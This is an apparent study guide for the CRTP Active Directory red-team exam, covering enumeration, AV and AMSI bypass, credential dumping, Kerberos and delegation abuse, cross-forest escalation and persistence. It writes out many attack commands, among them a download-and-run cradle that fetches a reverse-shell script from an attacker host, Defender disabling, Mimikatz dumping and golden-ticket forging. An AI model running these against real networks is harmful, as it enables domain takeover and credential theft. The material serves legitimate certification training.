# CRTP — Certified Red Team Professional | Complete Exam Plan

> **Goal of this document:** A single, end-to-end study + exam-execution plan for Altered Security's **CRTP** ("Attacking and Defending Active Directory", taught by Nikhil Mittal). It covers every topic in depth from initial access to the final report, folds in real exam feedback from people who have passed, and highlights the most important resources.
>
> **Last reviewed:** 2026-07-26
> **Author focus:** A Kali/red-team operator wanting a structured, lab-driven path to the cert.

---

## 0. What CRTP Actually Is (Read This First)

| Item | Detail |
|------|--------|
| Provider | Altered Security (formerly Pentester Academy / AttackDefend Labs) — Nikhil Mittal |
| Course | "Attacking and Defending Active Directory" |
| Difficulty | **Beginner-to-intermediate AD** — rated "moderate," easier than OSCP because it is AD-only, but AMSI/Defender evasion adds real friction |
| Lab | Fully patched **Windows Server 2022 + SQL Server 2017**, multi-domain, multi-forest; accessed via browser/VPN; student VM pre-loaded with tools + Sliver C2 |
| Lab length | 30 / 60 / 90 days (lifetime course-material access) |
| Price | $249 (30d) / $379 (60d) / $499 (90d) — exam attempt included; reattempt $99; bootcamp +$50 |
| Cert validity | **3 years**; **free** renewal exam before expiry (also renewable via CRTE/CETP/CRTM) |
| Prereqs | Basic AD understanding + Windows command line. OSCP-level methodology helps a lot. |
| Next step | **CRTE** (multi-forest, 48h, EDR-hardened) — do *not* jump straight to CRTE; get 6–12 months field/lab practice first. |

**The single most important fact about CRTP:** the exam is **100% misconfiguration / feature-abuse**. No CVEs, no patchable exploits. Every path comes from how Windows domains are *configured*, not what software is *unpatched*. Internalize this — it shapes your entire methodology.

---

## 1. Exam Format & Passing Criteria (Know the Target)

### Format
- **24 hours** hands-on in an individual, fully-patched Windows environment (multiple domains + forests).
- **+48 hours** to write and submit the report.
- Start: one **foothold machine** (a domain-joined user is given to you — use it, don't create your own; session issues burn time).
- **5 target machines** to compromise.
- No proctoring; self-service start; individual machine restarts + full environment reverts available.
- **Defender + AMSI are ON.** No tools pre-installed on the student VM — you bring your own toolkit.

### Goal
Achieve **OS-level command execution on all 5 targets.** Proof does **not** require a shell — even `dir \\target.domain.local\c$` showing the directory listing counts as proof of compromise. There are **no CTF flags**; the 5 machines *are* the flags, proven via screenshots + narrative.

### Passing = two independent gates (BOTH required)
1. **RCE on all 5 targets** (with screenshots). 2–4 RCEs may still earn partial credit if the report is excellent.
2. **A high-quality narrative report.** A vague "ran Mimikatz, got DA" report will **fail you even with 5 RCEs**. The report demonstrates your methodology and attacker mindset — you must explain *why* a technique worked, not just *what* you ran. Include **practical mitigations** citing OSS tools/talks/blogs (scores higher).

> **Consensus from passers:** hands-on portion takes **8–16 hours** of active work; report takes another **6–8 hours**. Most first-attempt passes finished well inside the 24h window. Treat it as a real engagement, not a CTF.

---

## 2. The 13-Module Curriculum (Your Study Map)

This is the official Altered Security module list — your study plan follows this order. Everything below maps to a phase of the kill chain.

| # | Module | Kill-chain phase | Depth |
|---|--------|------------------|-------|
| I | Active Directory Enumeration | Recon / Enumeration | Core |
| II | Offensive PowerShell Tradecraft | Bypasses / Execution | Core |
| III | Offensive .NET Tradecraft | Bypasses / Execution | Core |
| IV | Local Privilege Escalation | Privilege Escalation | Core |
| V | Domain Privilege Escalation | Privilege Escalation | Core |
| VI | Domain Persistence and Dominance | Persistence | Core |
| VII | Cross Trust Attacks | Lateral / Enterprise Escalation | Core |
| VIII | Abusing AD CS | Privilege Escalation | Core |
| IX | Defenses & Bypass — MDE (EDR) | Evasion | Important |
| X | Defenses & Bypass — MDI | Evasion | Important |
| XI | Defenses — Architecture & Work Culture | Defense | Read |
| XII | Defenses — Monitoring | Defense | Read |
| XIII | Defenses & Bypass — Deception | Defense / Evasion | Read |

---

## 3. Topic-by-Topic Deep Dive (Initial Access → Final Step)

### Phase A — Initial Access / Foothold
*In the exam you are handed a domain-joined low-priv user on the foothold box. In real life initial access differs, but for CRTP "initial access" = "land on the foothold, validate your user, and orient."*

**Tasks at foothold:**
1. Confirm user, domain, hostname: `whoami /all`, `hostname`, `ipconfig /all`, `nltest /domain_trusts`.
2. Test your tooling works (PowerShell cradle, AMSI bypass — see Phase B).
3. Start a structured note per host: IP, hostname, DC name, trust relationships, admin accounts, any creds found.
4. **Run BloodHound/SharpHound immediately** before any attacks — graph the attack paths.

> **Exam tip (from passers):** "If nothing shows up, try different tools, parameters, strategies. You have 24 hours — don't rush and don't get freaked out when you can't find anything." Map the environment first, always.

### Phase B — Bypasses (AMSI, Defender, Logging, CLM, AppLocker)
The lab/exam run **Defender + AMSI + (in places) AppLocker / Constrained Language Mode**. You cannot run stock Mimikatz/PowerView. Master these before anything else.

- **AMSI bypass** — multiple one-liners (obfuscated + clean); apply before importing any detected module. *e.g. use `Invoke-Mimi.ps1` (renamed) instead of `Invoke-Mimikatz`.*
- **Script Block Logging bypass (SBLoggingBypass)** — disable PowerShell ETW via reflection.
- **AMSI string/byte patching** — `AMSI` reflective patch, AMSITrigger to find flagged strings, DefenderCheck to test payloads.
- **Constrained Language Mode (CLM)** — `$ExecutionContext.SessionState.LanguageMode`; bypass via `System32` (Program Files) directory execution, or .NET loaders.
- **AppLocker** — enumerate `Get-AppLockerPolicy -Effective`; bypass via `C:\Windows\System32\` (default-allowed), or .NET assembly loaders / in-memory execution.
- **.NET loaders** — execute assemblies in-memory to bypass Defender; obfuscate binaries (ConfuserEx, custom).
- **"Magic Bypass"** — chain SBLogging + AMSI + CLM bypasses in sequence.
- **Tool hygiene** — `Set-MpPreference -DisableRealtimeMonitoring $true` only when you can; prefer stealth. Reverse strings, remove detected scripts, rename functions, rebuild DLLs, sandbox checks.

**Error bank (worth memorizing):**
- `Invoke-Mimi: "Cannot create type"` → language mode restriction; run from `C:\Windows\System32\` or a Program Files dir.
- `Loader: "Blocked by group policy"` → CLM/AppLocker; modify script to load inline.
- `Set-RemotePSRemoting: I/O operation aborted` → can be **ignored** (means success).

### Phase C — Execution / Tool Delivery
- Download-and-execute cradles: `Net.WebClient`, `Invoke-WebRequest`, `iex (iwr http://YOU/Invoke-PowerShellTcp.ps1 -UseBasicParsing)`.
- Import the **AD module** without RSAT: `Import-Module .\Microsoft.ActiveDirectory.Management.dll` or reflectively.
- **Know ≥3 file-transfer methods** — your preferred one may fail in the exam env. SMB, HTTP, netsh portproxy tunneling (`netsh interface portproxy`), base64 paste.
- Port forwarding via `netsh interface portproxy` is commonly used to tunnel tool delivery to islands.

### Phase D — Active Directory Enumeration (THE most important phase)
"Enumeration is king." Every compromise traces back to something you found here. Map **trusts, delegations, services, users, GPOs, ACLs**.

**Tools:** PowerView, ADModule, SharpView, BloodHound/SharpHound, PowerHuntShares, Invoke-SessionHunter, Snaffler.

**Enumerate (PowerView reference set):**
- Domain: `Get-NetDomain`, `Get-DomainSID`, `Get-DomainPolicy` (`(Get-DomainPolicy)."System Access"`, `net accounts`).
- DCs: `Get-NetDomainController`.
- Users: `Get-NetUser`, `select samaccountname, lastlogon, pwdlastset, memberof`; `Find-UserField -SearchField Description -SearchTerm "..."` (descriptions hide creds).
- Computers: `Get-NetComputer -FullData`, filter by OS, list names + OS versions.
- Groups: `Get-NetGroup`, `Get-NetGroupMember -Groupname "Domain Admins" -Recurse`; `Get-NetGroup -Username <u>`.
- Local groups on machines: `Get-NetLocalGroup -Computername <c> -ListGroups` / `-Recurse`.
- Logged-on users: `Get-NetLoggedon`, `Get-LoggedonLocal`, `Get-LastLoggedOn` — **find DA sessions to pwn.**
- Shares: `Invoke-ShareFinder -ExcludeStandard -ExcludePrint -ExcludeIPC`, `Invoke-FileFinder`, `Get-NetFileServer`, `Invoke-HuntSMBShares`, Snaffler for sensitive files.
- GPOs: `Get-NetGPO`, `Get-NetGPOGroup` (restricted groups), `Find-GPOComputerAdmin`, `Find-GPOLocation -Username <u>`, `Get-NetOU`, machines-in-OU.
- ACLs: `Get-ObjectACL -ResolveGUIDS`, `Invoke-ACLScanner -ResolveGUIDs` (filter `IdentityReference`), `Find-InterestingDomainAcl` — **find GenericAll/GenericWrite/WriteDACL/WriteOwner on users/groups/computers.**
- Trusts: `Get-NetDomainTrust`, `Get-NetForest`, `Get-NetForestDomain`, `Get-NetForestTrust`; intra-forest + inter-forest.
- Local-admin discovery (where am I admin?): `Find-LocalAdminAccess -Verbose`, `Find-WMILocalAdminAccess`, `Find-PSRemotingLocalAdminAccess`, `Invoke-EnumerateLocalAdmin`.
- Sessions/DA hunting: `Invoke-UserHunter -GroupName "Domain Admins" -CheckAccess`, `Find-DomainUserLocation`, `Invoke-SessionHunter` (use `-NoPortScan -Targets` for OPSEC).

**BloodHound (supplement independently — course coverage is shallow per reviewers):**
- Collect: `Invoke-BloodHound -CollectionMethod all`, SharpHound `--CollectionMethods All --ExcludeDCs` (OPSEC).
- Neo4j: `neo4j.bat install-service` then `start`; GUI at `localhost:7474`, bolt `bolt://localhost:7687`.
- Use prebuilt queries: *Find All Domain Admins, Shortest Paths to Domain Admins, Kerberoastable Users, AS-REP Roastable Users, Unconstrained Delegation Systems, Computers in Constrained Delegation, RBCD paths.*

> **Exam tip:** "Do not run Kerberoast on all users — target specific accounts." `--excludedcs` with SharpHound for OPSEC.

### Phase E — Local Privilege Escalation
You land as a low-priv domain user. Escalate to **local admin** on the foothold (and each box you touch).

**Automated checkers:** PowerUp (`Invoke-AllChecks`), Privesc (`Invoke-PrivEsc`), BeRoot, winPEAS.

**Techniques (kill-chain order):**
1. Service abuse — unquoted service paths (`Get-ServiceUnquoted`), modifiable service files (`Get-ServiceModifiableServiceFile`), `Invoke-ServiceAbuse -Name <svc> -UserName <domain>\<user>`, BinPath, service registry.
2. AlwaysInstallElevated, Autorun, Startup apps, DLL hijacking, Executable task paths.
3. **Potato attacks** — Juicy Potato (SeImpersonate), Hot Potato.
4. Kernel exploits (rare in CRTP — patched env, but worth knowing).
5. **Password mining** — Firefox saved creds, AutoLogon registry creds, browsers, config files, scripts, Group Policy Preferences (cpassword if old GPOs present).
6. `runas /savecred`, **Backup Operators** (read SAM/SYSTEM, or `reg save` + `secretsdump`), LAPS password extraction (`Get-ADObject -Properties ms-Mcs-AdmPwd` / `Get-LapsADPassword`), GPO-permission abuse.
7. Enterprise-app abuse — **Jenkins** (inject script into job config → local admin).
8. NTLM relaying / **GPOddity** (gpoddity.py — repoint GPO filesyspath to rogue SMB, push malicious command to OU-linked machines).
9. Add-user + enable-RDP one-liner for persistence on the foothold.

**LAPS:** enumerate who can read LAPS passwords (`Get-NetOU -FullData`, ACLs on `ms-Mcs-AdmPwd`), pull passwords, log in as local admin.

### Phase F — Lateral Movement
Once local admin on foothold, pivot to where DA sessions / useful creds live.

- **PowerShell Remoting:** `Enter-PSSession -ComputerName <fqdn>`, `$sess = New-PSSession`, `Invoke-Command -ComputerName <c> -ScriptBlock {whoami}`, load functions remotely (`-FilePath`, `${function:<name>}`), run across a list (`-ComputerName (Get-Content servers.txt)`).
- **winrs** — fallback when PSRemoting fails: `winrs -r:<fqdn> cmd`.
- **WMI / WMIC, PsExec (Impacket)** — `python3 psexec.py -hashes <LM>:<NT> <DOM>/<user>@<target>`; LM default `aad3b435b51404eeaad3b435b51404ee`.
- **Copy tools to targets:** `Copy-Item .\script.ps1 \\<server>\c$\'Program Files'` (Program Files bypasses CLM).
- **Mimikatz credential dumping:**
  - `Invoke-Mimikatz -DumpCreds` (single + multiple machines `-Computername @('s1','s2')`).
  - **OverPass-the-Hash (OPtH):** `sekurlsa::pth /user:<u> /domain:<d> /ntlm:<hash> /run:powershell.exe` → opens a PS session as that user. *Prefer AES256 keys over NTLM for OPSEC (blends with normal domain activity, avoids MDI).*
  - SAM dump in-memory: `"privilege::debug" "token::elevate" "lsadump::sam"`.
  - SAM via hives: `reg save HKLM\SAM Sam.hiv` + `reg save HKLM\SYSTEM System.hiv` → `lsadump::sam SamBkup.hiv SystemBkup.hiv` / `secretsdump.py -sam Sam.hiv -system System.hiv LOCAL`.
  - LSA on DC (gets krbtgt): `lsadump::lsa /patch`.
  - Credential vault: `vault::cred /patch`; DPAPI / Credential Vault / LSA Registry / SAM Hive.

**OPtH vs PtH:** PtH reuses an NTLM hash for NTLM auth (noisy). OPtH uses the hash to request a **TGT** (Kerberos), then proceeds normally — much quieter.

> **Exam tip:** Use **FQDN** for `Enter-PSSession`. For NTLM/PTH, set `TrustedHosts` (`Set-Item WSMan:\localhost\Client\TrustedHosts *`). If `winrs` fails, try `Enter-PSSession` and vice versa. PS Remoting needs **local admin** on target. Machine-account hashes → select AES256 with SID `S-1-5-18` (SYSTEM).

### Phase G — Domain Privilege Escalation (FOOTHOLD → DOMAIN ADMIN)
This is the heart of CRTP. Reach Domain Admin via feature abuse, not exploits.

1. **Kerberoasting** — find SPN users (`Get-NetUser -SPN`), request TGS (`New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"` or `Request-SPNTicket`, Rubeus `kerberoast`), export (`Kerberos::list /export`), crack (`tgsrepcrack.py`, `hashcat -m 13100`). Crack service-account passwords offline.
2. **AS-REP Roasting** — users with preauth disabled (`Get-DomainUser -PreauthNotRequired`), `Invoke-ASREPRoast` / `Get-ASREPHash`, crack (`hashcat -m 18200`, insert `23` after `$krb5asrep$`). *With GenericAll/GenericWrite you can force-disable preauth: `Set-DomainObject -Identity <u> -XOR @{useraccountcontrol=4194304}`.*
3. **Targeted Kerberoasting (Set SPN)** — with GenericAll/GenericWrite on a user, set an SPN (`Set-DomainObject -Identity <u> -Set @{serviceprincipalname='ops/whatever1'}`), Kerberoast them, then remove SPN.
4. **Unconstrained Delegation** — find unconstrained computers (`Get-NetComputer -UnConstrained`), get local admin, run Rubeus monitor, **force DC auth** (`MS-RPRN.exe` / PrinterBug → coerce DC to authenticate to you), steal the DA TGT, `kerberos::ptt`, DCSync.
5. **Constrained Delegation (protocol transition)** — `Get-DomainUser -TrustedToAuth` / `Get-DomainComputer -TrustedToAuth`; compromise first hop, Kekeo/Rubeus `s4u` to impersonate DA, `/altservice` to reach high-impact services (CIFS, HOST, HTTP, LDAP, RPCSS). User-based and computer-based both.
6. **RBCD (Resource-Based Constrained Delegation)** — with GenericAll/GenericWrite on a *computer*, configure RBCD (`Set-DomainRBCD` / `Set-ADComputer -PrincipalsAllowedToDelegateToAccount <atk>$`), extract your machine-account hash, `s4u` to access target as any user.
7. **DNSAdmins** — members can load arbitrary DLL on DNS server (usually DC): `dnscmd <dns> /config /serverlevelplugindll \\<ip>\share\mimilib.dll`, `sc \\<dns> stop dns` then `start dns` → code on DC.
8. **SQL Server abuse (PowerUpSQL)** — `Get-SQLInstanceDomain`, `Get-SQLConnectionTestThreaded`, `Get-SQLServerLink -Instance <i>`, `Get-SQLServerLinkCrawl` (crawl linked servers across forests), enable `xp_cmdshell`, exec commands, reverse shell.
9. **Protected Groups / derivative local admin** — abuse enterprise apps in whitelisted envs; chain AV bypass + pivoting.
10. **ACL attacks** — GenericAll: reset password / add SPN / set userAccountControl. GenericWrite: set SPN, modify. WriteDACL: grant yourself DCSync rights. WriteOwner: take ownership then grant. `Add-DomainObjectAcl` / `Add-ObjectAcl`.
11. **DCSync** — once you have `DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All` (or granted via ACL), `lsadump::dcsync /user:<d>\krbtgt` — pull **krbtgt** and any DA hashes. **Run DCSync on a DC (not remotely) to avoid MDI detection.**

### Phase H — Enterprise / Cross-Trust Escalation (CHILD DA → ENTERPRISE ADMIN)
Once Domain Admin in a child domain, escalate across the forest trust.

1. **Trust Key abuse** — dump trust keys (`lsadump::trust /patch` or `lsadump::dcsync /user:<d>\<child>$`), forge **inter-realm TGT** with parent's Enterprise Admin SID in `sids` (`Kerberos::golden /user:Administrator /domain:<child> /sid:<childSID> /sids:<EA-SID> /rc4:<trustHash> /service:krbtgt /target:<parent> /ticket:<path>`), `asktgs.exe`, `kirbikator.exe`, verify `ls \\<parentDC>\c$`.
2. **krbtgt abuse (as child DA — SID History injection)** — forge golden ticket with child krbtgt hash **+ parent EA SID** in `/sids`, inject, access parent domain resources directly.
3. **krbtgt abuse (as child DC)** — forge golden ticket for `CHILDDC$` with DC group SID + EA SID, DCSync the **parent** krbtgt, then forge a parent golden ticket, `winrs` to parent DC.
4. **External trust** — dump trust key, forge inter-realm TGT, request TGS for the explicitly-shared target service, access only shared resources.
5. **MSSQL linked servers across forests** — PowerUpSQL `Get-SQLServerLinkCrawl` to hop forest-to-forest for code execution.

> **Exam tip:** "Cannot use asktgt across realms — must forge inter-realm ticket using the trust key; specify parent SID and domain."

### Phase I — Abusing AD CS (Certificate Services)
ADCS attacks (ESC1–ESC8) are now in the CRTP curriculum and frequently appear.

- Enumerate CAs and templates: `Certify.exe cas`, `Certify.exe find /vulnerable`.
- **ESC1** — misconfigured template allows enrollee to supply `SAN` (enroll as anyone, incl. DA). Request cert with `SAN=Administrator`, `Rubeus asktgt /certificate:...` → DA TGT.
- **ESC2–ESC8** — various template misconfig + ESC8 = NTLM relay to HTTP cert enrollment endpoint (Web Enrollment). Map each ESC to its prerequisite ACL/misconfig.
- Cross-domain: ADCS can be the bridge to escalate to Enterprise Admins across trust.

### Phase J — Domain Persistence & Dominance (post-DA)
Demonstrates dominance — usually the *last* technique on each chain and report-worthy. All assume DA.

| Technique | Requires | Method |
|-----------|----------|--------|
| **Golden Ticket** | krbtgt hash + domain SID | `Kerberos::golden /user:Administrator /domain:<d> /sid:<SID> /krbtgt:<hash> /id:500 /groups:512 /ptt` |
| **Silver Ticket** | service/computer hash + SPN | `Kerberos::golden ... /target:<t> /service:CIFS /rc4:<hash> /ptt` (HOST for schtasks, HOST+RPCSS for WMI, HTTP for WinRM). Impersonated user *must* have rights to target service. |
| **Diamond Ticket** | krbtgt hash | Rubeus `diamond /tgtdeleg` — modify a legit TGT instead of forging (OPSEC). |
| **Skeleton Key** | DA | `misc::skeleton` on DC → auth as anyone w/ password `mimikatz`. *Noted as failed in some lab setups — understand it conceptually.* |
| **DSRM** | DA + DSRM admin hash | dump DSRM (`token::elevate` `lsadump::sam`), set `DsrmAdminLogonBehavior=2`, PTH DSRM admin to DC. |
| **Custom SSP (memssp)** | DA | `misc::memssp` → logs plaintext creds to `C:\Windows\System32\kiwissp.log`. |
| **AdminSDHolder** | DA | `Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' ... -Rights All`, run `Invoke-SDPropagator`, then add yourself to Domain Admins permanently (template re-SDs protected groups every 60min). |
| **DCSync rights** | DA process | `Add-DomainObjectAcl -TargetDistinguishedName 'DC=...' -Rights DCSync` → user can now DCSync forever. |
| **WMI SecurityDescriptor** | DA on DC | `Set-RemoteWMI` (RACE toolkit). |
| **PSRemoting SecurityDescriptor** | DA on DC | `Set-RemotePSRemoting`. |
| **Remote Registry backdoor (DAMP)** | DA on DC | `Add-RemoteRegBackdoor` → retrieve machine/local hashes + cached creds later. |
| **DC host security descriptor** | minimal rights | modify host security descriptors on the DC for command execution *without* DA. |
| **DC safe-mode (DSRM) admin** | — | abuse DC safe mode Administrator for persistence. |

### Phase K — Defense & Evasion Awareness (Read, don't skip)
Reviewers who skipped defense modules did worse. Understanding defender visibility makes your attacks quieter and is itself exam-relevant.

- **MDE (Microsoft Defender for Endpoint)** — telemetry + detection components; run a full forest-trust chain *without* triggering MDE; verify via Security 365 dashboard.
- **MDI (Microsoft Defender for Identity)** — anomaly detection; it flags DCSync-from-non-DC, unusual Kerberos, anomalous sessions. **Bypass: run DCSync on the DC, use AES keys, blend with normal domain activity.**
- **Architecture defenses** — Temporal groups, ACL auditing, **LAPS**, **SID Filtering**, **Selective Authentication**, **Credential Guard**, **Device Guard**, **Protected Users**, **PAW**, **Tiered Admin**, **ESAE/Red Forest**. Know what each blocks so you know which technique still works.
- **Monitoring events** — which Windows events fire per attack (4768/4769 TGT/TGS, 4624 logon, 4672 special privs, 4662 AD object access, etc.).
- **Deception** — decoy users/computers/groups with tempting ACLs; know how adversaries identify decoys (low logon, recent creation, weird attrs) so you don't trip them in the exam (and so you can counter as a defender).

---

## 4. The Full Kill-Chain (How It All Chains on Exam Day)

A representative CRTP exam chain, start to finish:

```
1. FOOTHOLD (given low-priv domain user)
   └─ Phase B: AMSI/Defender/CLM bypass
   └─ Phase C: deliver tooling (PowerView, SharpHound, Rubeus, Mimikatz, Certify)
   └─ Phase D: BloodHound + PowerView enumeration → find attack paths

2. MACHINE 1 — Local privilege escalation (Phase E)
   └─ PowerUp/service abuse/Jenkins/LAPS → local admin on foothold
   └─ Dump creds: Mimikatz LSASS, SAM, vault → reuse hashes

3. MACHINE 2 — Lateral movement (Phase F)
   └─ Find-LocalAdminAccess / Invoke-UserHunter (DA session)
   └─ PSRemoting/winrs/PTH → land on box with DA session
   └─ Dump DA creds → DCSync rights via ACL (Phase G)

4. DOMAIN ADMIN (Phase G)
   └─ DCSync krbtgt (on DC, AES, avoid MDI)
   └─ OR: Kerberoasting / AS-REP / Constrained Delegation s4u / RBCD / DNSAdmins / ADCS ESC1
   └─ Now Domain Admin in child domain

5. MACHINES 3–4 — Pivot through SQL links / delegation / unconstrained
   └─ PowerUpSQL link crawl across forests
   └─ Unconstrained delegation + PrinterBug to steal DC TGT

6. ENTERPRISE ADMIN (Phase H) — cross-trust
   └─ Trust key OR child krbtgt + EA SID history injection
   └─ Forge inter-realm TGT → parent DC c$ access

7. MACHINE 5 — final target, often in parent/forest-root
   └─ DCSync parent krbtgt → Golden Ticket → RCE on final box
   └─ Screenshot `dir \\target\c$` as proof

8. PERSISTENCE (Phase J) — demonstrate dominance for the report
   └─ Golden/Silver/Diamond Ticket, AdminSDHolder, DCSync-rights persistence

9. REPORT (Phase L) — within the same 24h if possible
```

> **Note:** CRTP exam = single-forest scope for the *5 machines*, but the course teaches cross-trust. Be ready for a target that requires a trust hop. Multiple reviewers reported constrained delegation, SQL links, DCSync, and cross-forest Golden Ticket via SID-history injection in their exams.

---

## 5. Preparation Strategy (How to Actually Get Ready)

### Timeline (recommended: 60-day lab)
- **Days 1–20:** Watch all 14h of video + follow along in lab. Take notes per attack (see Note Format below). Complete the ~40 lab flags.
- **Days 21–35:** Re-do the lab **using only your own cheat sheet** (no manual). This is where technique internalizes.
- **Days 36–45:** Supplement weak areas — BloodHound (independently), ADCS (Certify/Rubeus), PowerUpSQL, AMSI/Defender evasion, cross-trust.
- **Days 46–55:** Run GOAD (Game Of Active Directory) locally as extra practice; do HTB AD tracks (if available).
- **Days 56–60:** Build the exam toolkit ZIP, report template, password lists, hashcat setup. Dry-run your full kill chain.

> **Consensus:** 30 days is tight, 90 risks losing momentum. **60 days is the sweet spot.** Don't skip the defense modules.

### Note Format (do this for EVERY attack — it does "half the work" for the report)
For each technique, capture:
1. **What** the attack achieves
2. **Vulnerability / misconfig** behind it
3. **How** to perform it (step-by-step)
4. **Tools** + **exact commands** (copy-paste ready)
5. **Expected success message** AND **expected error messages** (build an error bank)
6. **OPSEC / detection notes** (MDI/MDE visibility, quieter alternatives)
7. **Mitigation** (for the report's remediation section)
8. **External reading** — read 2–3 external articles per attack so nothing is missed

### Build a Cheat Sheet Organized by *Attack Category* (not by course chapter)
One page per: Enumeration · Local Privesc · Lateral Movement · Domain Privesc · Persistence · Cross-Trust · ADCS · Bypass. The exam is open-note; good notes win.

---

## 6. Exam-Day Playbook

### Before You Start
- **Pre-stage ONE toolkit ZIP**, locally served via HTTP:
  - PowerView_dev (the `_dev` build has `Set-DomainObject`, `Set-DomainRBCD`, etc.)
  - SharpHound (version **matching** your BloodHound/Neo4j — mismatch breaks imports)
  - Obfuscated Mimikatz / `Invoke-Mimi.ps1` (renamed)
  - Rubeus, Kekeo, PowerUpSQL, Certify, RACE toolkit, DAMP toolkit
  - A PowerShell obfuscator (Invoke-Obfuscation / AMSI Bypass), AMSITrigger, DefenderCheck
  - `Invoke-PowerShellTcp.ps1` reverse shell, Impacket (psexec/secretsdump/wmiexec)
  - CrackMapExec, Snaffler, PowerUp, winPEAS
- Prepare: **report template** (SysReptor/PwnDoc/pentestreports.com), BloodHound+Neo4j running locally, hashcat + rockyou + wordlists, netcat listener.
- Verify ≥3 file-transfer methods work.

### During the Exam
1. **Start notes immediately** — segregate by hostname/IP/DC/trust/admin account (Obsidian works well).
2. **BloodHound first.** Map before attacking.
3. **Bypass AMSI/Defender/CLM before importing any tool.**
4. **Enumerate repeatedly** — different tools, params, angles. You have 24h; don't rush.
5. **Read output carefully** — stepping stones are usually visible but overlooked.
6. **When stuck:** restart the machine (responsiveness issues are common); take a break rather than rabbit-hole.
7. **Use the given foothold user** — don't create your own (session issues waste time).
8. **Screenshot EVERYTHING** as you go. Missing a screenshot = redo the step.
9. **Try things, don't assume** — "don't overlook anything but also don't go too deep."
10. **Write the report DURING the 24h window** while lab access is live (you can re-grab screenshots), not after.
11. Take breaks to celebrate small wins — keeps perspective.

### Report (the second gate — can fail you solo)
**Structure (narrative, not pentest-style):**
1. Title page (target, date, owner)
2. Table of contents
3. **Executive Summary** — engagement summary, scenario (insider attack sim from a compromised domain-joined box), in/out of scope, methodology, remarks
4. **Methodology & Goals** — kill-chain alignment (Recon → Enum → Exploit → Privesc → Lateral → Post-Exploit)
5. **Attack Narrative** (the core) — per-machine breakdown:
   - Initial access / foothold
   - Each machine: gaining access → privesc → lateral to next
   - **Explain *why* each command/param worked**, not just what. Include how you found the values you fed in.
6. **Remediation & Recommendations** — per-target + general, with citations to OSS tools/talks/blogs (scores higher)
7. **References**
8. **Tools used**

**Report tips from passers:**
- Length: ~11 to 37+ pages — quality over quantity, but detail matters.
- Vague "ran Mimikatz, got DA" **fails**. Explain methodology and attacker mindset.
- Include practical mitigations citing sources.
- Treat as a real engagement — stay in scope, focus on the 5 RCE goals.
- **Take a day off work for report writing** if you can.
- Reports have ranged up to ~117 pages for thorough passers; aim for clear, professional, well-formatted.

---

## 7. Common Pitfalls (from real passers)
- **Going down rabbit holes** — "a fine line on how hard to try before moving on; comes with experience." Timebox each technique.
- **Tools not behaving as expected** — go in with no expectations; have alternatives ready.
- **Missing proof/screenshots** → forced to redo steps under time pressure.
- **Ignoring defense modules** → worse attack execution and weaker remediation section.
- **Creating your own foothold user** → session issues.
- **Only knowing one file-transfer method** → when it fails you stall.
- **Shallow BloodHound** → the course's coverage is light; study it independently.
- **Stock Mimikatz/PowerView** → Defender/AMSI catch them. Obfuscate *everything* first.
- **Kerberoasting all users** → noisy and slow; target specific accounts.
- **Running DCSync remotely** → MDI flags it; run on the DC.

---

## 8. Tool Reference (the CRTP toolkit)

| Tool | Purpose |
|------|---------|
| **PowerView / PowerView_dev** | AD enum, ACL abuse, share finding (dev build adds `Set-DomainObject`, `Set-DomainRBCD`) |
| **ADModule** | Enumeration via official MS AD module (reflectively loaded) |
| **SharpView** | .NET port of PowerView (Defender-friendly) |
| **BloodHound / SharpHound** | Attack-path graphing + collection |
| **Neo4j** | BloodHound backend |
| **Mimikatz** (`Invoke-Mimi`) | Cred dump, ticket forge, PtH/OPtH, DCSync, Skeleton Key |
| **Rubeus** | Kerberos abuse: kerberoast, s4u, asktgt, diamond/golden/silver, monitor |
| **Kekeo** (`asktgs`, `kirbikator`, `tgt::ask`, `tgs::s4u`) | TGT/TGS requests, S4U delegation |
| **PowerUpSQL** | SQL instance enum + linked-server crawl + xp_cmdshell |
| **Certify** | ADCS CA/template enumeration + vulnerable cert hunting |
| **PowerUp / Privesc / BeRoot / winPEAS** | Local privesc checks |
| **DAMP toolkit** (`Add-RemoteRegBackdoor`, `RemoteHashRetrieval`) | Remote registry backdoor + hash retrieval |
| **RACE toolkit** (`Set-RemoteWMI`, `Set-RemotePSRemoting`) | Security-descriptor persistence |
| **Invoke-SessionHunter / PowerHuntShares / Snaffler** | Session/share/file hunting |
| **Impacket** (`psexec`, `secretsdump`, `wmiexec`, `ntlmrelayx`) | Remote exec, hash dump, NTLM relay |
| **CrackMapExec** | Mass enumeration + spray |
| **Hashcat** | Offline cracking — modes 13100 (TGS), 18200 (Kerberos/AS-REP) |
| **AMSI Bypass / AMSITrigger / DefenderCheck / Invoke-Obfuscation** | Evasion |
| **gpoddity.py / ntlmrelayx** | GPO abuse / NTLM relay |
| **MS-RPRN.exe (PrinterBug)** | Coerce DC auth for unconstrained delegation |
| **GOAD** | Local practice lab (Game Of Active Directory) |

**Hashcat mode reference:**
- Kerberoast TGS (RC4): `-m 13100`
- Kerberoast TGS (AES256): `-m 19700`
- AS-REP Roast: `-m 18200` (insert `23` after `$krb5asrep$`)
- LM default placeholder: `aad3b435b51404eeaad3b435b51404ee`

---

## 9. Highlighted Resources (study these)

### Your shared notes (primary)
- **0xStarlight CRTP-Notes** — clean topic structure: Domain Enum → Local Privesc (16 techniques) → Lateral → Domain Persistence → Domain Privesc → Forest & Trusts. Good backbone. https://github.com/0xStarlight/CRTP-Notes
- **0xJs CRTP-cheatsheet** — the most complete command reference (PowerView, Mimikatz, Kekeo, PowerUpSQL, DAMP, cross-trust). Use as your copy-paste command bank. https://github.com/0xJs/CRTP-cheatsheet
- **Team Anonymous CRTP Notes (gitbook)** — official 13-module mapping + exam goals + GOAD recommendation. https://team-anonymous.gitbook.io/certified-red-team-professional-crtp-notes
- **Michelle Novenda (hackmd)** — modern exam-prep notes incl. Rubeus, ADCS/Certify, RBCD, error bank. Strong on newer tooling. https://hackmd.io/@michellenovenda/S1bBSXdckl
- **Dinesh Kumaar (Medium series)** — lateral movement + credential extraction depth (Mimikatz variants, DPAPI, PtH vs OPtH, AES>RC4 OPSEC, DCSync). https://medium.com/@dineshkumaar478/the-road-to-crtp-cert-part-13-8d14193f660f

### Official / course
- **Altered Security ADLab (course home)** — curriculum, pricing, lab + exam details. https://www.alteredsecurity.com/adlab
- **dumpsgate CRTP** — exam format confirmation (5 machines, misconfig-only). https://dumpsgate.com/crtp-certification/
